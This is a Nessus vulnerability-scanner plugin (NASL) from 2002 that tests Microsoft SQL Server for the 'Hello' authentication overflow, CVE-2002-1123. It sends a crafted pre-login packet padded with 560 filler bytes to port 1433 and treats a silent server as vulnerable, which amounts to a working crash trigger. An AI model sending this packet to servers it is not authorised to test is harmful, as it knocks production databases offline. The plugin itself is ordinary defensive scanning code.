##
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# this script tests for the "You had me at hello" overflow
# in MSSQL (tcp/1433)
# Copyright Dave Aitel (2002)
# Bug found by: Dave Aitel (2002)
#
##
#TODO:
#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!

# Changes by Tenable:
# - Revised plugin title (6/8/09)


include("compat.inc");

if(description)
{

 script_id(11067);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2002-1123");
 script_bugtraq_id(5411);
 script_xref(name:"OSVDB", value:"10132");
 script_xref(name:"IAVA", value:"2002-B-0007");

 script_name(english:"Microsoft SQL Server Authentication Function Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote database server is affected by a remote command execution
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote MS SQL server is vulnerable to the Hello overflow.

An attacker may use this flaw to execute commands against the remote 
host as LOCAL/SYSTEM, as well as read your database content. 

*** This alert might be a false positive." );
 script_set_attribute(attribute:"see_also", value:"http://support.microsoft.com/default.aspx?scid=kb;en-us;Q316333&sd=tech" );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/MS02-056.mspx" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-08/0009.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-08/0009.html" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from the Microsoft Bulletin." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Microsoft SQL Hello Overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Dave Aitel");
 script_family(english:"Databases");
 script_require_ports(1433, "Services/mssql");
 script_dependencie("mssqlserver_detect.nasl", "mssql_version.nasl"); 
 exit(0);
}


include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

version = get_kb_item("mssql/SQLVersion");
if(version)
{
 if(!ereg(pattern:"^8\.00\.(0?[0-5][0-9][0-9]|0?6[0-5][0-9]|66[0-4])",
 	  string:version))exit(0);
}


#
# The script code starts here
#
#taken from mssql.spk
pkt_hdr = raw_string(
0x12 ,0x01 ,0x00 ,0x34 ,0x00 ,0x00 ,0x00 ,0x00  ,0x00 ,0x00 ,0x15 ,0x00 ,0x06 ,0x01 ,0x00 ,0x1b
,0x00 ,0x01 ,0x02 ,0x00 ,0x1c ,0x00 ,0x0c ,0x03  ,0x00 ,0x28 ,0x00 ,0x04 ,0xff ,0x08 ,0x00 ,0x02
,0x10 ,0x00 ,0x00 ,0x00
);

#taken from mssql.spk
pkt_tail = raw_string (
0x00 ,0x24 ,0x01 ,0x00 ,0x00
);

#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!
port = get_kb_item("Services/mssql");
if(!port)port = 1433;

found = 0;
report = "The SQL Server is vulnerable to the Hello overflow.";


if(get_port_state(port))
{
    soc = open_sock_tcp(port);

    if(soc)
    {
    	#uncomment this to see what normally happens
        #attack_string="MSSQLServer";
	#uncomment next line to actually test for overflow
	attack_string=crap(560);
        # this creates a variable called sql_packet
	sql_packet = string(pkt_hdr,attack_string,pkt_tail);
	send(socket:soc, data:sql_packet);
        r  = recv(socket:soc, length:4096);
	close(soc);
	#display ("Result:",r,"\n");
	if(!r)
	    {
	    # display("Security Hole in MSSQL\n");
            security_hole(port);
	    }
    }
}
